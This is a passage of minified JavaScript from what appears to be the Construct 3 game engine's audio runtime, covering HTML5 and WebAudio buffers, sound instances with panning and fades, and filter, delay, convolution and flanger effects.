        this._audioElem.addEventListener(
          'canplaythrough',
          () => (this._reachedCanPlayThrough = !0)
        ),
        (this._outNode = this.GetAudioContext().createGain()),
        (this._mediaSourceNode = null),
        this._audioElem.addEventListener('canplay', () => {
          this._loadResolve &&
            ((this._loadState = 'loaded'),
            this._loadResolve(),
            (this._loadResolve = null),
            (this._loadReject = null)),
            !this._mediaSourceNode &&
              this._audioElem &&
              ((this._mediaSourceNode =
                this.GetAudioContext().createMediaElementSource(
                  this._audioElem
                )),
              this._mediaSourceNode.connect(this._outNode));
        }),
        (this.onended = null),
        this._audioElem.addEventListener('ended', () => {
          this.onended && this.onended();
        }),
        this._audioElem.addEventListener('error', (e) => this._OnError(e));
    }
    Release() {
      this._audioDomHandler.ReleaseInstancesForBuffer(this),
        this._outNode.disconnect(),
        (this._outNode = null),
        this._mediaSourceNode.disconnect(),
        (this._mediaSourceNode = null),
        this._audioElem && !this._audioElem.paused && this._audioElem.pause(),
        (this.onended = null),
        (this._audioElem = null),
        super.Release();
    }
    _Load() {
      return (
        (this._loadState = 'loading'),
        new Promise((resolve, reject) => {
          (this._loadResolve = resolve),
            (this._loadReject = reject),
            (this._audioElem.src = this._url);
        })
      );
    }
    _OnError(e) {
      console.error(`[Construct] Audio '${this._url}' error: `, e),
        this._loadReject &&
          ((this._loadState = 'failed'),
          this._loadReject(e),
          (this._loadResolve = null),
          (this._loadReject = null));
    }
    IsLoaded() {
      const ret = this._audioElem.readyState >= 4;
      return (
        ret && (this._reachedCanPlayThrough = !0),
        ret || this._reachedCanPlayThrough
      );
    }
    IsLoadedAndDecoded() {
      return this.IsLoaded();
    }
    GetAudioElement() {
      return this._audioElem;
    }
    GetOutputNode() {
      return this._outNode;
    }
    GetDuration() {
      return this._audioElem.duration;
    }
  }),
  (self.C3WebAudioBuffer = class C3WebAudioBuffer extends self.C3AudioBuffer {
    constructor(
      audioDomHandler,
      originalUrl,
      url,
      type,
      isMusic,
      needsSoftwareDecode
    ) {
      super(audioDomHandler, originalUrl, url, type, isMusic),
        (this._api = 'webaudio'),
        (this._audioData = null),
        (this._audioBuffer = null),
        (this._needsSoftwareDecode = !!needsSoftwareDecode);
    }
    Release() {
      this._audioDomHandler.ReleaseInstancesForBuffer(this),
        (this._audioData = null),
        (this._audioBuffer = null),
        super.Release();
    }
    async _Fetch() {
      if (this._audioData) return this._audioData;
      const iRuntime = this._audioDomHandler.GetRuntimeInterface();
      if (
        'cordova' === iRuntime.GetExportType() &&
        iRuntime.IsRelativeURL(this._url) &&
        iRuntime.IsFileProtocol()
      )
        this._audioData = await iRuntime.CordovaFetchLocalFileAsArrayBuffer(
          this._url
        );
      else {
        const response = await fetch(this._url);
        if (!response.ok)
          throw new Error(
            `error fetching audio data: ${response.status} ${response.statusText}`
          );
        this._audioData = await response.arrayBuffer();
      }
    }
    async _Decode() {
      if (this._audioBuffer) return this._audioBuffer;
      (this._audioBuffer = await this._audioDomHandler.DecodeAudioData(
        this._audioData,
        this._needsSoftwareDecode
      )),
        (this._audioData = null);
    }
    async _Load() {
      try {
        (this._loadState = 'loading'),
          await this._Fetch(),
          await this._Decode(),
          (this._loadState = 'loaded');
      } catch (err) {
        (this._loadState = 'failed'),
          console.error(
            `[Construct] Failed to load audio '${this._url}': `,
            err
          );
      }
    }
    IsLoaded() {
      return !(!this._audioData && !this._audioBuffer);
    }
    IsLoadedAndDecoded() {
      return !!this._audioBuffer;
    }
    GetAudioBuffer() {
      return this._audioBuffer;
    }
    GetDuration() {
      return this._audioBuffer ? this._audioBuffer.duration : 0;
    }
  });
{
  let nextAiId = 0;
  self.C3AudioInstance = class C3AudioInstance {
    constructor(audioDomHandler, buffer, tags) {
      (this._audioDomHandler = audioDomHandler),
        (this._buffer = buffer),
        (this._tags = tags),
        (this._aiId = nextAiId++),
        (this._gainNode = this.GetAudioContext().createGain()),
        this._gainNode.connect(this.GetDestinationNode()),
        (this._pannerNode = null),
        (this._isPannerEnabled = !1),
        (this._pannerPosition = [0, 0, 0]),
        (this._pannerOrientation = [0, 0, 0]),
        (this._pannerConeParams = [0, 0, 0]),
        (this._stereoPannerNode = null),
        (this._isStereoPannerEnabled = !1),
        (this._stereoPan = 0),
        (this._isStopped = !0),
        (this._isPaused = !1),
        (this._resumeMe = !1),
        (this._isLooping = !1),
        (this._volume = 1),
        (this._isMuted = !1),
        (this._playbackRate = 1);
      const timeScaleMode = this._audioDomHandler.GetTimeScaleMode();
      (this._isTimescaled =
        (1 === timeScaleMode && !this.IsMusic()) || 2 === timeScaleMode),
        (this._instUid = -1),
        (this._fadeEndTime = -1),
        (this._stopOnFadeEnd = !1);
    }
    Release() {
      (this._audioDomHandler = null),
        (this._buffer = null),
        this._pannerNode &&
          (this._pannerNode.disconnect(), (this._pannerNode = null)),
        this._stereoPannerNode &&
          (this._stereoPannerNode.disconnect(),
          (this._stereoPannerNode = null)),
        this._gainNode.disconnect(),
        (this._gainNode = null);
    }
    GetAudioContext() {
      return this._audioDomHandler.GetAudioContext();
    }
    SetTags(tags) {
      this._tags = tags;
    }
    GetTags() {
      return this._tags;
    }
    GetEffectTag() {
      return this._tags.length > 0 ? this._tags[0] : '';
    }
    GetDestinationNode() {
      return this._audioDomHandler.GetDestinationForTag(this.GetEffectTag());
    }
    GetCurrentTime() {
      return this._isTimescaled
        ? this._audioDomHandler.GetGameTime()
        : performance.now() / 1e3;
    }
    GetOriginalUrl() {
      return this._buffer.GetOriginalUrl();
    }
    GetUrl() {
      return this._buffer.GetUrl();
    }
    GetContentType() {
      return this._buffer.GetContentType();
    }
    GetBuffer() {
      return this._buffer;
    }
    IsMusic() {
      return this._buffer.IsMusic();
    }
    GetAiId() {
      return this._aiId;
    }
    HasEnded() {}
    CanBeRecycled() {}
    IsPlaying() {
      return !this._isStopped && !this._isPaused && !this.HasEnded();
    }
    IsActive() {
      return !this._isStopped && !this.HasEnded();
    }
    GetPlaybackTime() {}
    GetDuration(applyPlaybackRate) {
      let ret = this._buffer.GetDuration();
      return applyPlaybackRate && (ret /= this._playbackRate || 0.001), ret;
    }
    Play(isLooping, vol, seekPos, scheduledTime) {}
    Stop() {}
    Pause() {}
    IsPaused() {
      return this._isPaused;
    }
    Resume() {}
    SetVolume(v) {
      (this._volume = v),
        this._gainNode.gain.cancelScheduledValues(0),
        (this._fadeEndTime = -1),
        (this._gainNode.gain.value = this.GetOutputVolume());
    }
    FadeVolume(vol, duration, stopOnEnd) {
      if (this.IsMuted()) return;
      const gainParam = this._gainNode.gain;
      gainParam.cancelScheduledValues(0);
      const currentTime = this._audioDomHandler.GetAudioCurrentTime(),
        endTime = currentTime + duration;
      gainParam.setValueAtTime(gainParam.value, currentTime),
        gainParam.linearRampToValueAtTime(vol, endTime),
        (this._volume = vol),
        (this._fadeEndTime = endTime),
        (this._stopOnFadeEnd = stopOnEnd);
    }
    _UpdateVolume() {
      this.SetVolume(this._volume);
    }
    Tick(currentTime) {
      -1 !== this._fadeEndTime &&
        currentTime >= this._fadeEndTime &&
        ((this._fadeEndTime = -1),
        this._stopOnFadeEnd && this.Stop(),
        this._audioDomHandler.PostTrigger(
          'fade-ended',
          this._tags,
          this._aiId
        ));
    }
    GetOutputVolume() {
      const ret = this._volume;
      return isFinite(ret) ? ret : 0;
    }
    SetMuted(m) {
      (m = !!m),
        this._isMuted !== m && ((this._isMuted = m), this._UpdateMuted());
    }
    IsMuted() {
      return this._isMuted;
    }
    IsSilent() {
      return this._audioDomHandler.IsSilent();
    }
    _UpdateMuted() {}
    SetLooping(l) {}
    IsLooping() {
      return this._isLooping;
    }
    SetPlaybackRate(r) {
      this._playbackRate !== r &&
        ((this._playbackRate = r), this._UpdatePlaybackRate());
    }
    _UpdatePlaybackRate() {}
    GetPlaybackRate() {
      return this._playbackRate;
    }
    Seek(pos) {}
    SetSuspended(s) {}
    SetPannerEnabled(e) {
      (e = !!e),
        this._isPannerEnabled !== e &&
          ((this._isPannerEnabled = e),
          this._isPannerEnabled
            ? (this.SetStereoPannerEnabled(!1),
              this._pannerNode ||
                ((this._pannerNode = this.GetAudioContext().createPanner()),
                (this._pannerNode.panningModel =
                  this._audioDomHandler.GetPanningModel()),
                (this._pannerNode.distanceModel =
                  this._audioDomHandler.GetDistanceModel()),
                (this._pannerNode.refDistance =
                  this._audioDomHandler.GetReferenceDistance()),
                (this._pannerNode.maxDistance =
                  this._audioDomHandler.GetMaxDistance()),
                (this._pannerNode.rolloffFactor =
                  this._audioDomHandler.GetRolloffFactor())),
              this._gainNode.disconnect(),
              this._gainNode.connect(this._pannerNode),
              this._pannerNode.connect(this.GetDestinationNode()))
            : (this._pannerNode.disconnect(),
              this._gainNode.disconnect(),
              this._gainNode.connect(this.GetDestinationNode())));
    }
    SetPan(x, y, z, angle, innerAngle, outerAngle, outerGain) {
      if (!this._isPannerEnabled) return;
      this.SetPanXYZA(x, y, z, angle);
      const toDegrees = self.AudioDOMHandler.ToDegrees;
      this._pannerConeParams[0] !== toDegrees(innerAngle) &&
        ((this._pannerConeParams[0] = toDegrees(innerAngle)),
        (this._pannerNode.coneInnerAngle = toDegrees(innerAngle))),
        this._pannerConeParams[1] !== toDegrees(outerAngle) &&
          ((this._pannerConeParams[1] = toDegrees(outerAngle)),
          (this._pannerNode.coneOuterAngle = toDegrees(outerAngle))),
        this._pannerConeParams[2] !== outerGain &&
          ((this._pannerConeParams[2] = outerGain),
          (this._pannerNode.coneOuterGain = outerGain));
    }
    SetPanXYZA(x, y, z, angle) {
      if (!this._isPannerEnabled) return;
      const pos = this._pannerPosition,
        orient = this._pannerOrientation,
        cosa = Math.cos(angle),
        sina = Math.sin(angle);
      (pos[0] === x && pos[1] === y && pos[2] === z) ||
        ((pos[0] = x),
        (pos[1] = y),
        (pos[2] = z),
        this._pannerNode.setPosition(...pos)),
        (orient[0] === cosa && orient[1] === sina && 0 === orient[2]) ||
          ((orient[0] = cosa),
          (orient[1] = sina),
          (orient[2] = 0),
          this._pannerNode.setOrientation(...orient));
    }
    SetStereoPannerEnabled(e) {
      (e = !!e),
        this._isStereoPannerEnabled !== e &&
          ((this._isStereoPannerEnabled = e),
          this._isStereoPannerEnabled
            ? (this.SetPannerEnabled(!1),
              (this._stereoPannerNode =
                this.GetAudioContext().createStereoPanner()),
              this._gainNode.disconnect(),
              this._gainNode.connect(this._stereoPannerNode),
              this._stereoPannerNode.connect(this.GetDestinationNode()))
            : (this._stereoPannerNode.disconnect(),
              (this._stereoPannerNode = null),
              this._gainNode.disconnect(),
              this._gainNode.connect(this.GetDestinationNode())));
    }
    SetStereoPan(p) {
      this._isStereoPannerEnabled &&
        this._stereoPan !== p &&
        ((this._stereoPannerNode.pan.value = p), (this._stereoPan = p));
    }
    SetUID(uid) {
      this._instUid = uid;
    }
    GetUID() {
      return this._instUid;
    }
    GetResumePosition() {}
    Reconnect(toNode) {
      const outNode =
        this._stereoPannerNode || this._pannerNode || this._gainNode;
      outNode.disconnect(), outNode.connect(toNode);
    }
    GetState() {
      return {
        aiid: this.GetAiId(),
        tags: this._tags,
        duration: this.GetDuration(),
        volume:
          -1 === this._fadeEndTime ? this._volume : this._gainNode.gain.value,
        isPlaying: this.IsPlaying(),
        playbackTime: this.GetPlaybackTime(),
        playbackRate: this.GetPlaybackRate(),
        uid: this._instUid,
        bufferOriginalUrl: this.GetOriginalUrl(),
        bufferUrl: '',
        bufferType: this.GetContentType(),
        isMusic: this.IsMusic(),
        isLooping: this.IsLooping(),
        isMuted: this.IsMuted(),
        resumePosition: this.GetResumePosition(),
        pan: this.GetPanState(),
        stereoPan: this.GetStereoPanState(),
      };
    }
    _LoadAdditionalState(d) {
      this.SetPlaybackRate(d.playbackRate), this.SetMuted(d.isMuted);
    }
    GetPanState() {
      if (!this._pannerNode) return null;
      const pn = this._pannerNode;
      return {
        pos: this._pannerPosition,
        orient: this._pannerOrientation,
        cia: pn.coneInnerAngle,
        coa: pn.coneOuterAngle,
        cog: pn.coneOuterGain,
        uid: this._instUid,
      };
    }
    LoadPanState(d) {
      if (!d) return void this.SetPannerEnabled(!1);
      this.SetPannerEnabled(!0);
      const pn = this._pannerNode,
        panPos = d.pos;
      (this._pannerPosition[0] = panPos[0]),
        (this._pannerPosition[1] = panPos[1]),
        (this._pannerPosition[2] = panPos[2]);
      const panOrient = d.orient;
      (this._pannerOrientation[0] = panOrient[0]),
        (this._pannerOrientation[1] = panOrient[1]),
        (this._pannerOrientation[2] = panOrient[2]),
        pn.setPosition(...this._pannerPosition),
        pn.setOrientation(...this._pannerOrientation),
        (this._pannerConeParams[0] = d.cia),
        (this._pannerConeParams[1] = d.coa),
        (this._pannerConeParams[2] = d.cog),
        (pn.coneInnerAngle = d.cia),
        (pn.coneOuterAngle = d.coa),
        (pn.coneOuterGain = d.cog),
        (this._instUid = d.uid);
    }
    GetStereoPanState() {
      return this._stereoPannerNode ? this._stereoPan : null;
    }
    LoadStereoPanState(p) {
      'number' == typeof p
        ? (this.SetStereoPannerEnabled(!0), this.SetStereoPan(p))
        : this.SetStereoPannerEnabled(!1);
    }
  };
}
(self.C3Html5AudioInstance = class C3Html5AudioInstance extends (
  self.C3AudioInstance
) {
  constructor(audioDomHandler, buffer, tags) {
    super(audioDomHandler, buffer, tags),
      this._buffer.GetOutputNode().connect(this._gainNode),
      (this._buffer.onended = () => this._OnEnded());
  }
  Release() {
    this.Stop(), this._buffer.GetOutputNode().disconnect(), super.Release();
  }
  GetAudioElement() {
    return this._buffer.GetAudioElement();
  }
  _OnEnded() {
    (this._isStopped = !0),
      (this._instUid = -1),
      this._audioDomHandler.PostTrigger('ended', this._tags, this._aiId);
  }
  HasEnded() {
    return this.GetAudioElement().ended;
  }
  CanBeRecycled() {
    return !!this._isStopped || this.HasEnded();
  }
  GetPlaybackTime() {
    let ret = this.GetAudioElement().currentTime;
    return this._isLooping || (ret = Math.min(ret, this.GetDuration())), ret;
  }
  Play(isLooping, vol, seekPos, scheduledTime) {
    const audioElem = this.GetAudioElement();
    if (
      (1 !== audioElem.playbackRate && (audioElem.playbackRate = 1),
      audioElem.loop !== isLooping && (audioElem.loop = isLooping),
      this.SetVolume(vol),
      (this._isMuted = !1),
      audioElem.muted && (audioElem.muted = !1),
      audioElem.currentTime !== seekPos)
    )
      try {
        audioElem.currentTime = seekPos;
      } catch (err) {
        console.warn(
          `[Construct] Exception seeking audio '${this._buffer.GetUrl()}' to position '${seekPos}': `,
          err
        );
      }
    this._audioDomHandler.TryPlayMedia(audioElem),
      (this._isStopped = !1),
      (this._isPaused = !1),
      (this._isLooping = isLooping),
      (this._playbackRate = 1);
  }
  Stop() {
    const audioElem = this.GetAudioElement();
    audioElem.paused || audioElem.pause(),
      this._audioDomHandler.RemovePendingPlay(audioElem),
      (this._isStopped = !0),
      (this._isPaused = !1),
      (this._instUid = -1);
  }
  Pause() {
    if (this._isPaused || this._isStopped || this.HasEnded()) return;
    const audioElem = this.GetAudioElement();
    audioElem.paused || audioElem.pause(),
      this._audioDomHandler.RemovePendingPlay(audioElem),
      (this._isPaused = !0);
  }
  Resume() {
    !this._isPaused ||
      this._isStopped ||
      this.HasEnded() ||
      (this._audioDomHandler.TryPlayMedia(this.GetAudioElement()),
      (this._isPaused = !1));
  }
  _UpdateMuted() {
    this.GetAudioElement().muted = this._isMuted || this.IsSilent();
  }
  SetLooping(l) {
    (l = !!l),
      this._isLooping !== l &&
        ((this._isLooping = l), (this.GetAudioElement().loop = l));
  }
  _UpdatePlaybackRate() {
    let r = this._playbackRate;
    this._isTimescaled && (r *= this._audioDomHandler.GetTimeScale());
    try {
      this.GetAudioElement().playbackRate = r;
    } catch (err) {
      console.warn(`[Construct] Unable to set playback rate '${r}':`, err);
    }
  }
  Seek(pos) {
    if (!this._isStopped && !this.HasEnded())
      try {
        this.GetAudioElement().currentTime = pos;
      } catch (err) {
        console.warn(`[Construct] Error seeking audio to '${pos}': `, err);
      }
  }
  GetResumePosition() {
    return this.GetPlaybackTime();
  }
  SetSuspended(s) {
    s
      ? this.IsPlaying()
        ? (this.GetAudioElement().pause(), (this._resumeMe = !0))
        : (this._resumeMe = !1)
      : this._resumeMe &&
        (this._audioDomHandler.TryPlayMedia(this.GetAudioElement()),
        (this._resumeMe = !1));
  }
}),
  (self.C3WebAudioInstance = class C3WebAudioInstance extends (
    self.C3AudioInstance
  ) {
    constructor(audioDomHandler, buffer, tags) {
      super(audioDomHandler, buffer, tags),
        (this._bufferSource = null),
        (this._onended_handler = (e) => this._OnEnded(e)),
        (this._hasPlaybackEnded = !0),
        (this._activeSource = null),
        (this._playStartTime = 0),
        (this._playFromSeekPos = 0),
        (this._resumePosition = 0),
        (this._muteVol = 1);
    }
    Release() {
      this.Stop(),
        this._ReleaseBufferSource(),
        (this._onended_handler = null),
        super.Release();
    }
    _ReleaseBufferSource() {
      this._bufferSource &&
        ((this._bufferSource.onended = null),
        this._bufferSource.disconnect(),
        (this._bufferSource.buffer = null)),
        (this._bufferSource = null),
        (this._activeSource = null);
    }
    _OnEnded(e) {
      this._isPaused ||
        this._resumeMe ||
        (e.target === this._activeSource &&
          ((this._hasPlaybackEnded = !0),
          (this._isStopped = !0),
          (this._instUid = -1),
          this._ReleaseBufferSource(),
          this._audioDomHandler.PostTrigger('ended', this._tags, this._aiId)));
    }
    HasEnded() {
      return (
        !(!this._isStopped && this._bufferSource && this._bufferSource.loop) &&
        !this._isPaused &&
        this._hasPlaybackEnded
      );
    }
    CanBeRecycled() {
      return !(this._bufferSource && !this._isStopped) || this.HasEnded();
    }
    GetPlaybackTime() {
      let ret = 0;
      return (
        (ret = this._isPaused
          ? this._resumePosition
          : this._playFromSeekPos +
            (this.GetCurrentTime() - this._playStartTime) * this._playbackRate),
        this._isLooping || (ret = Math.min(ret, this.GetDuration())),
        ret
      );
    }
    Play(isLooping, vol, seekPos, scheduledTime) {
      (this._isMuted = !1),
        (this._muteVol = 1),
        this.SetVolume(vol),
        this._ReleaseBufferSource(),
        (this._bufferSource = this.GetAudioContext().createBufferSource()),
        (this._bufferSource.buffer = this._buffer.GetAudioBuffer()),
        this._bufferSource.connect(this._gainNode),
        (this._activeSource = this._bufferSource),
        (this._bufferSource.onended = this._onended_handler),
        (this._bufferSource.loop = isLooping),
        this._bufferSource.start(scheduledTime, seekPos),
        (this._hasPlaybackEnded = !1),
        (this._isStopped = !1),
        (this._isPaused = !1),
        (this._isLooping = isLooping),
        (this._playbackRate = 1),
        (this._playStartTime = this.GetCurrentTime()),
        (this._playFromSeekPos = seekPos);
    }
    Stop() {
      if (this._bufferSource)
        try {
          this._bufferSource.stop(0);
        } catch (err) {}
      (this._isStopped = !0), (this._isPaused = !1), (this._instUid = -1);
    }
    Pause() {
      this._isPaused ||
        this._isStopped ||
        this.HasEnded() ||
        ((this._resumePosition = this.GetPlaybackTime()),
        this._isLooping && (this._resumePosition %= this.GetDuration()),
        (this._isPaused = !0),
        this._bufferSource.stop(0));
    }
    Resume() {
      !this._isPaused ||
        this._isStopped ||
        this.HasEnded() ||
        (this._ReleaseBufferSource(),
        (this._bufferSource = this.GetAudioContext().createBufferSource()),
        (this._bufferSource.buffer = this._buffer.GetAudioBuffer()),
        this._bufferSource.connect(this._gainNode),
        (this._activeSource = this._bufferSource),
        (this._bufferSource.onended = this._onended_handler),
        (this._bufferSource.loop = this._isLooping),
        this._UpdateVolume(),
        this._UpdatePlaybackRate(),
        this._bufferSource.start(0, this._resumePosition),
        (this._playStartTime = this.GetCurrentTime()),
        (this._playFromSeekPos = this._resumePosition),
        (this._isPaused = !1));
    }
    GetOutputVolume() {
      return super.GetOutputVolume() * this._muteVol;
    }
    _UpdateMuted() {
      (this._muteVol = this._isMuted || this.IsSilent() ? 0 : 1),
        this._UpdateVolume();
    }
    SetLooping(l) {
      (l = !!l),
        this._isLooping !== l &&
          ((this._isLooping = l),
          this._bufferSource && (this._bufferSource.loop = l));
    }
    _UpdatePlaybackRate() {
      let r = this._playbackRate;
      this._isTimescaled && (r *= this._audioDomHandler.GetTimeScale()),
        this._bufferSource && (this._bufferSource.playbackRate.value = r);
    }
    Seek(pos) {
      this._isStopped ||
        this.HasEnded() ||
        (this._isPaused
          ? (this._resumePosition = pos)
          : (this.Pause(), (this._resumePosition = pos), this.Resume()));
    }
    GetResumePosition() {
      return this._resumePosition;
    }
    SetSuspended(s) {
      s
        ? this.IsPlaying()
          ? ((this._resumeMe = !0),
            (this._resumePosition = this.GetPlaybackTime()),
            this._isLooping && (this._resumePosition %= this.GetDuration()),
            this._bufferSource.stop(0))
          : (this._resumeMe = !1)
        : this._resumeMe &&
          (this._ReleaseBufferSource(),
          (this._bufferSource = this.GetAudioContext().createBufferSource()),
          (this._bufferSource.buffer = this._buffer.GetAudioBuffer()),
          this._bufferSource.connect(this._gainNode),
          (this._activeSource = this._bufferSource),
          (this._bufferSource.onended = this._onended_handler),
          (this._bufferSource.loop = this._isLooping),
          this._UpdateVolume(),
          this._UpdatePlaybackRate(),
          this._bufferSource.start(0, this._resumePosition),
          (this._playStartTime = this.GetCurrentTime()),
          (this._playFromSeekPos = this._resumePosition),
          (this._resumeMe = !1));
    }
    _LoadAdditionalState(d) {
      super._LoadAdditionalState(d), (this._resumePosition = d.resumePosition);
    }
  });
{
  class AudioFXBase {
    constructor(audioDomHandler) {
      (this._audioDomHandler = audioDomHandler),
        (this._audioContext = audioDomHandler.GetAudioContext()),
        (this._index = -1),
        (this._tag = ''),
        (this._type = ''),
        (this._params = null);
    }
    Release() {
      this._audioContext = null;
    }
    _SetIndex(i) {
      this._index = i;
    }
    GetIndex() {
      return this._index;
    }
    _SetTag(t) {
      this._tag = t;
    }
    GetTag() {
      return this._tag;
    }
    CreateGain() {
      return this._audioContext.createGain();
    }
    GetInputNode() {}
    ConnectTo(node) {}
    SetAudioParam(ap, value, ramp, time) {
      if ((ap.cancelScheduledValues(0), 0 === time))
        return void (ap.value = value);
      const curTime = this._audioContext.currentTime;
      switch (((time += curTime), ramp)) {
        case 0:
          ap.setValueAtTime(value, time);
          break;
        case 1:
          ap.setValueAtTime(ap.value, curTime),
            ap.linearRampToValueAtTime(value, time);
          break;
        case 2:
          ap.setValueAtTime(ap.value, curTime),
            ap.exponentialRampToValueAtTime(value, time);
      }
    }
    GetState() {
      return { type: this._type, tag: this._tag, params: this._params };
    }
  }
  (self.C3AudioFilterFX = class C3AudioFilterFX extends AudioFXBase {
    constructor(audioDomHandler, type, freq, detune, q, gain, mix) {
      super(audioDomHandler),
        (this._type = 'filter'),
        (this._params = [type, freq, detune, q, gain, mix]),
        (this._inputNode = this.CreateGain()),
        (this._wetNode = this.CreateGain()),
        (this._wetNode.gain.value = mix),
        (this._dryNode = this.CreateGain()),
        (this._dryNode.gain.value = 1 - mix),
        (this._filterNode = this._audioContext.createBiquadFilter()),
        (this._filterNode.type = type),
        (this._filterNode.frequency.value = freq),
        (this._filterNode.detune.value = detune),
        (this._filterNode.Q.value = q),
        (this._filterNode.gain.vlaue = gain),
        this._inputNode.connect(this._filterNode),
        this._inputNode.connect(this._dryNode),
        this._filterNode.connect(this._wetNode);
    }
    Release() {
      this._inputNode.disconnect(),
        this._filterNode.disconnect(),
        this._wetNode.disconnect(),
        this._dryNode.disconnect(),
        super.Release();
    }
    ConnectTo(node) {
      this._wetNode.disconnect(),
        this._wetNode.connect(node),
        this._dryNode.disconnect(),
        this._dryNode.connect(node);
    }
    GetInputNode() {
      return this._inputNode;
    }
    SetParam(param, value, ramp, time) {
      switch (param) {
        case 0:
          (value = Math.max(Math.min(value / 100, 1), 0)),
            (this._params[5] = value),
            this.SetAudioParam(this._wetNode.gain, value, ramp, time),
            this.SetAudioParam(this._dryNode.gain, 1 - value, ramp, time);
          break;
        case 1:
          (this._params[1] = value),
            this.SetAudioParam(this._filterNode.frequency, value, ramp, time);
          break;
        case 2:
          (this._params[2] = value),
            this.SetAudioParam(this._filterNode.detune, value, ramp, time);
          break;
        case 3:
          (this._params[3] = value),
            this.SetAudioParam(this._filterNode.Q, value, ramp, time);
          break;
        case 4:
          (this._params[4] = value),
            this.SetAudioParam(this._filterNode.gain, value, ramp, time);
      }
    }
  }),
    (self.C3AudioDelayFX = class C3AudioDelayFX extends AudioFXBase {
      constructor(audioDomHandler, delayTime, delayGain, mix) {
        super(audioDomHandler),
          (this._type = 'delay'),
          (this._params = [delayTime, delayGain, mix]),
          (this._inputNode = this.CreateGain()),
          (this._wetNode = this.CreateGain()),
          (this._wetNode.gain.value = mix),
          (this._dryNode = this.CreateGain()),
          (this._dryNode.gain.value = 1 - mix),
          (this._mainNode = this.CreateGain()),
          (this._delayNode = this._audioContext.createDelay(delayTime)),
          (this._delayNode.delayTime.value = delayTime),
          (this._delayGainNode = this.CreateGain()),
          (this._delayGainNode.gain.value = delayGain),
          this._inputNode.connect(this._mainNode),
          this._inputNode.connect(this._dryNode),
          this._mainNode.connect(this._wetNode),
          this._mainNode.connect(this._delayNode),
          this._delayNode.connect(this._delayGainNode),
          this._delayGainNode.connect(this._mainNode);
      }
      Release() {
        this._inputNode.disconnect(),
          this._wetNode.disconnect(),
          this._dryNode.disconnect(),
          this._mainNode.disconnect(),
          this._delayNode.disconnect(),
          this._delayGainNode.disconnect(),
          super.Release();
      }
      ConnectTo(node) {
        this._wetNode.disconnect(),
          this._wetNode.connect(node),
          this._dryNode.disconnect(),
          this._dryNode.connect(node);
      }
      GetInputNode() {
        return this._inputNode;
      }
      SetParam(param, value, ramp, time) {
        const DbToLinear = self.AudioDOMHandler.DbToLinear;
        switch (param) {
          case 0:
            (value = Math.max(Math.min(value / 100, 1), 0)),
              (this._params[2] = value),
              this.SetAudioParam(this._wetNode.gain, value, ramp, time),
              this.SetAudioParam(this._dryNode.gain, 1 - value, ramp, time);
            break;
          case 4:
            (this._params[1] = DbToLinear(value)),
              this.SetAudioParam(
                this._delayGainNode.gain,
                DbToLinear(value),
                ramp,
                time
              );
            break;
          case 5:
            (this._params[0] = value),
              this.SetAudioParam(this._delayNode.delayTime, value, ramp, time);
        }
      }
    }),
    (self.C3AudioConvolveFX = class C3AudioConvolveFX extends AudioFXBase {
      constructor(audioDomHandler, buffer, normalize, mix) {
        super(audioDomHandler),
          (this._type = 'convolution'),
          (this._params = [normalize, mix]),
          (this._bufferOriginalUrl = ''),
          (this._bufferUrl = ''),
          (this._bufferType = ''),
          (this._inputNode = this.CreateGain()),
          (this._wetNode = this.CreateGain()),
          (this._wetNode.gain.value = mix),
          (this._dryNode = this.CreateGain()),
          (this._dryNode.gain.value = 1 - mix),
          (this._convolveNode = this._audioContext.createConvolver()),
          (this._convolveNode.normalize = normalize),
          (this._convolveNode.buffer = buffer),
          this._inputNode.connect(this._convolveNode),
          this._inputNode.connect(this._dryNode),
          this._convolveNode.connect(this._wetNode);
      }
      Release() {
        this._inputNode.disconnect(),
          this._convolveNode.disconnect(),
          this._wetNode.disconnect(),
          this._dryNode.disconnect(),
          super.Release();
      }
      ConnectTo(node) {
        this._wetNode.disconnect(),
          this._wetNode.connect(node),
          this._dryNode.disconnect(),
          this._dryNode.connect(node);
      }
      GetInputNode() {
        return this._inputNode;
      }
      SetParam(param, value, ramp, time) {
        if (0 === param)
          (value = Math.max(Math.min(value / 100, 1), 0)),
            (this._params[1] = value),
            this.SetAudioParam(this._wetNode.gain, value, ramp, time),
            this.SetAudioParam(this._dryNode.gain, 1 - value, ramp, time);
      }
      _SetBufferInfo(bufferOriginalUrl, bufferUrl, bufferType) {
        (this._bufferOriginalUrl = bufferOriginalUrl),
          (this._bufferUrl = bufferUrl),
          (this._bufferType = bufferType);
      }
      GetState() {
        const ret = super.GetState();
        return (
          (ret.bufferOriginalUrl = this._bufferOriginalUrl),
          (ret.bufferUrl = ''),
          (ret.bufferType = this._bufferType),
          ret
        );
      }
    }),
    (self.C3AudioFlangerFX = class C3AudioFlangerFX extends AudioFXBase {
      constructor(audioDomHandler, delay, modulation, freq, feedback, mix) {
        super(audioDomHandler),
          (this._type = 'flanger'),
          (this._params = [delay, modulation, freq, feedback, mix]),
          (this._inputNode = this.CreateGain()),
          (this._dryNode = this.CreateGain()),
          (this._dryNode.gain.value = 1 - mix / 2),
          (this._wetNode = this.CreateGain()),
          (this._wetNode.gain.value = mix / 2),
          (this._feedbackNode = this.CreateGain()),
          (this._feedbackNode.gain.value = feedback),
          (this._delayNode = this._audioContext.createDelay(
            delay + modulation
          )),
          (this._delayNode.delayTime.value = delay),
          (this._oscNode = this._audioContext.createOscillator()),
          (this._oscNode.frequency.value = freq),
          (this._oscGainNode = this.CreateGain()),
          (this._oscGainNode.gain.value = modulation),
          this._inputNode.connect(this._delayNode),
          this._inputNode.connect(this._dryNode),
          this._delayNode.connect(this._wetNode),
          this._delayNode.connect(this._feedbackNode),
          this._feedbackNode.connect(this._delayNode),
          this._oscNode.connect(this._oscGainNode),
          this._oscGainNode.connect(this._delayNode.delayTime),
          this._oscNode.start(0);
      }
      Release() {
        this._oscNode.stop(0),
          this._inputNode.disconnect(),
          this._delayNode.disconnect(),
          this._oscNode.disconnect(),
          this._oscGainNode.disconnect(),
          this._dryNode.disconnect(),
          this._wetNode.disconnect(),
          this._feedbackNode.disconnect(),
          super.Release();
      }
      ConnectTo(node) {
        this._wetNode.disconnect(),
          this._wetNode.connect(node),
          this._dryNode.disconnect(),
          this._dryNode.connect(node);
      }
      GetInputNode() {
        return this._inputNode;
      }
      SetParam(param, value, ramp, time) {
        switch (param) {
          case 0:
            (value = Math.max(Math.min(value / 100, 1), 0)),
              (this._params[4] = value),
              this.SetAudioParam(this._wetNode.gain, value / 2, ramp, time),
              this.SetAudioParam(this._dryNode.gain, 1 - value / 2, ramp, time);
            break;
          case 6:
            (this._params[1] = value / 1e3),
              this.SetAudioParam(
                this._oscGainNode.gain,
